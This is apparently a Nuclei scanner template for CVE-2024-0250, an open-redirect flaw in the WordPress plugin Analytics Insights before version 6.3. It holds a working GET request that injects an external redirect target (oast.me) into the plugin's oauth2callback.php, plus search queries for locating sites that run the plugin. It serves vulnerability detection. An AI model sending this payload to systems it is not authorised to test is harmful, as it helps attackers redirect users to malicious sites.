id: CVE-2024-0250

info:
  name: Analytics Insights for Google Analytics 4 < 6.3 - Open Redirect
  author: s4e-io
  severity: medium
  description: |
    The plugin is vulnerable to Open Redirect due to insufficient validation on the redirect oauth2callback.php file. This makes it possible for unauthenticated attackers to redirect users to potentially malicious sites if they can successfully trick them into performing an action.
  remediation: |
    Fixed in 6.3
  reference:
    - https://wpscan.com/vulnerability/321b07d1-692f-48e9-a8e5-a15b38efa979/
    - https://github.com/fkie-cad/nvd-json-data-feeds
    - https://nvd.nist.gov/vuln/detail/CVE-2024-0250
  classification:
    epss-score: 0.2513
    epss-percentile: 0.9597
  metadata:
    max-request: 1
    verified: true
    fofa-query: body="/wp-content/plugins/analytics-insights"
    publicwww-query: "/wp-content/plugins/analytics-insights"
  tags: cve,cve2024,wpscan,redirect,wp,wp-plugin,wordpress,analytics-insights,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-content/plugins/analytics-insights/tools/oauth2callback.php?state=https://oast.me/%3f&code=x"

    matchers:
      - type: regex
        part: header
        regex:
          - '(?m)^(?:Location\s*?:\s*?)(?:https?://|//)?(?:[a-zA-Z0-9\-_\.@]*)oast\.me.*$'
# digest: 4b0a00483046022100ed2e075fec5a5ab22fe41b3dee4f7a5b305dee067159b1faabb1da191deddca70221008037f70483236a76a34e307391c9bf0351ab1f84db7e0c918532d9984e16b3b8:922c64590222798bb761d5b6d8e72950